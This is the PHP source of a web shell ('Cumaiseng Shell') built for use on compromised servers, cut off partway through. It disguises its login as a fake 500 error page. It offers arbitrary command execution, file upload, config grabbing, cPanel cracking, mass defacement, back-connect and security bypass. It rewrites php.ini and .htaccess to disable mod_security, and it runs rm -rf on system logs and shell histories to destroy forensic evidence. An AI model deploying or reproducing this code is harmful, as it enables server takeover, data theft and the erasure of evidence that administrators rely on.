<?php
session_start();
set_time_limit(0);
error_reporting(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
date_default_timezone_set("Asia/Jakarta");
$auth_pass = "a68a78bef839eb1f4e2e9ff8459944c0";

function login() { 
$cumaiseng ="<html><head><title> Cumaiseng Shell</title><link rel='shortcut icon' href='http://www.cumaiseng.org/assets/images/music.png'></head>";
$cumaiseng.="<font color=green>cumaiseng@".$_SERVER['HTTP_HOST']." :~$ sudo su</font>";
$cumaiseng.="<form method='POST'><label for='pass'><font color=green>[ sudo ] password for cumaiseng: </label><input type='password' name='pass' style='border:0;color:transparent;width:120px;background-color:transparent;'></form>";
$cumaiseng.="</html>";   
if(empty($_GET['pal'])=="kon"){
echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head>
<title>500 Internal Server Error</title>
</head>
<body>
<h1>Internal Server Error  </h1>
<p>The server encountemaroon an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at 
 webmaster@'.$_SERVER['HTTP_HOST'].' to inform them of the time this error occurmaroon,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
<p>Additionally, a 500 Internal Server Error
error was encountemaroon while trying to use an ErrorDocument to handle the request.</p><hr>
<address>'.$_SERVER['SERVER_SOFTWARE'].' Server at '.$_SERVER['HTTP_HOST'].' Port 80</address></body></html>
';
}else{
	echo $cumaiseng;
	echo "<body style='background-color:black'>";
}
exit;
}
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $auth_pass) || 
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
       login();
?>
<html>
<head>
<title>Cumaiseng Webshell</title>
<script src="https://cumaiseng.github.io/assets/titip.js"></script>
<link rel="shortcut icon" href="http://www.cumaiseng.org/assets/images/music.png"/>
<link rel="stylesheet" href="https://cumaiseng.github.io/assets/titip.css"/>
</head>
<?php

function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=maroon>".$perm."</font>";
	} else {
		return "<font color=green>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=maroon>".$perm."</font>";
	} else {
		return "<font color=green>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	$info = 'p';
	} else {
	$info = 'u';
	}
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}

error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=maroon>ON</font>" : "<font color=green>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=maroon>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=maroon>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=green>ON</font>" : "<font color=maroon>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=green>ON</font>" : "<font color=maroon>OFF</font>";
$python = (exe('python --help')) ? "<font color=green>ON</font>" : "<font color=maroon>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=green>Thanks God, It's NONE !</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "<div id='kotak' style='border: 1px dashed grey; margin: 5px; padding: 2px;'>";
echo "<a href='?'><img src='https://i.imgur.com/jHy8Dmu.png' width='220' height='80' align='left'></a>";
echo "<table style='padding-left=1px' align='left'>";
echo "System: <font color=green>".php_uname()."</font><br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "User: <font color=green>".$user." (".$uid.")</font> Group: <font color=green>".$group." (".$gid.")</font><br>";
echo "Server IP: <font color=green>".gethostbyname($_SERVER['HTTP_HOST'])."</font> | Your IP: <font color=green>" .$_SERVER['REMOTE_ADDR']."</font><br>";
echo "Safe Mode: $sm | Disable Functions: <a href='?dir=$dir&do=ds'><font color=gold>CHECK</font></a><br>";
echo "[<a href='?shell&do=kill' style='padding:0px 8px 0px 8px;'>K I L L </a>]&nbsp;[<a href='?shell&delete=logs' style='padding:0px 8px 0px 8px;'>D E L. L O G S </a>]&nbsp;[<a href='?byee&do=logout' style='color:red; padding:0px 8px 0px 8px;'>L O G O U T</a>]";
echo "</table>";
echo "</div>";
echo "<div id='menu' style='border: 1px dashed grey; margin: 5px; padding: 2px;'>";
echo "<center>";
echo "<ul>";
echo "<li>[<a href='?dir=$dir&do=upload'>Upload</a>]</li>";
echo "<li>[<a href='?dir=$dir&do=adminer'>Adminer</a>]</li>";
echo "<li>[<a href='?dir=$dir&config=grabber'>Config</a>]</li>";
echo "<li>[<a href='?dir=$dir&do=jumping'>Jumping</a>]</li>";
echo "<li>[<a href='?dir=$dir&do=sym'>Symlink</a>]</li>";
echo "<li>[<a href='?dir=$dir&do=cgi'>CGI Perl</a>]</li>";
echo "<li>[<a href='?dir=$dir&do=cpanel'>Cpanel Crack</a>]</li>";
echo "<li>[<a href='?dir=$dir&do=mass_deface'>Mass Tools</a>]</li>";
echo "<li>[<a href='?dir=$dir&do=bypass'>Bypass</a>]</li>";
echo "<li>[<a href='?dir=$dir&do=cmd'>Command</a>]</li>";
echo "<li>[<a href='?dir=$dir&do=backconnect'>Back Connect</a>]</li>";
echo "</ul>";
echo "</center>";
echo "</div>";
echo "<hr color='transparent'>";
echo "<div style='border-bottom: 1px dashed grey; margin: 5px; padding: 2px; padding-bottom: 7px;'>";
echo "Current Dir : ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo " [ ".w($dir, perms($dir))." ]";
echo "</div>";
echo "<hr color='transparent'>";
echo "<center>";
if($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=green>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=maroon>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=green>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=maroon>failed to upload file</font>";
				}
			} else {
				$act = "<font color=maroon>failed to upload file</font>";
			}
		}
	}
	echo "Upload File:
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
	echo "</center>";
} elseif($_GET['do'] == 'bypassdf'){
		echo "<center>";
		echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=htce value='.htaccess' /></form>";
		if(isset($_POST['ini']))
{
		$file = fopen("php.ini","w");
		echo fwrite($file,"disable_functions=none
safe_mode = Off
	");
		fclose($file);
		echo "<a href='php.ini'>click here!</a>";
}		if(isset($_POST['htce']))
{
		$file = fopen(".htaccess","w");
		echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
	");
		fclose($file);
		echo "htaccess successfully created!";
}
		echo"</center>";
} elseif($_GET['delete'] == 'logs') {
  	echo '<br><center><b><span>Delete Logs ( For Safe )</span></b><center><br>';
	echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
	exec("rm -rf /tmp/logs");
	exec("rm -rf /root/.ksh_history");
	exec("rm -rf /root/.bash_history");
	exec("rm -rf /root/.bash_logout");
	exec("rm -rf /usr/local/apache/logs");
	exec("rm -rf /usr/local/apache/log");
	exec("rm -rf /var/apache/logs");
	exec("rm -rf /var/apache/log");
	exec("rm -rf /var/run/utmp");
	exec("rm -rf /var/logs");
	exec("rm -rf /var/log");
	exec("rm -rf /var/adm");
	exec("rm -rf /etc/wtmp");
	exec("rm -rf /etc/utmp");
	exec("rm -rf $HISTFILE");
	exec("rm -rf /var/log/lastlog");
	exec("rm -rf /var/log/wtmp");

	shell_exec("rm -rf /tmp/logs");
	shell_exec("rm -rf /root/.ksh_history");
	shell_exec("rm -rf /root/.bash_history");
	shell_exec("rm -rf /root/.bash_logout");
	shell_exec("rm -rf /usr/local/apache/logs");
	shell_exec("rm -rf /usr/local/apache/log");
	shell_exec("rm -rf /var/apache/logs");
	shell_exec("rm -rf /var/apache/log");
	shell_exec("rm -rf /var/run/utmp");
	shell_exec("rm -rf /var/logs");
	shell_exec("rm -rf /var/log");
	shell_exec("rm -rf /var/adm");
	shell_exec("rm -rf /etc/wtmp");
	shell_exec("rm -rf /etc/utmp");
	shell_exec("rm -rf $HISTFILE");
	shell_exec("rm -rf /var/log/lastlog");
	shell_exec("rm -rf /var/log/wtmp");

	passthru("rm -rf /tmp/logs");
	passthru("rm -rf /root/.ksh_history");
	passthru("rm -rf /root/.bash_history");
	passthru("rm -rf /root/.bash_logout");
	passthru("rm -rf /usr/local/apache/logs");
	passthru("rm -rf /usr/local/apache/log");
	passthru("rm -rf /var/apache/logs");
	
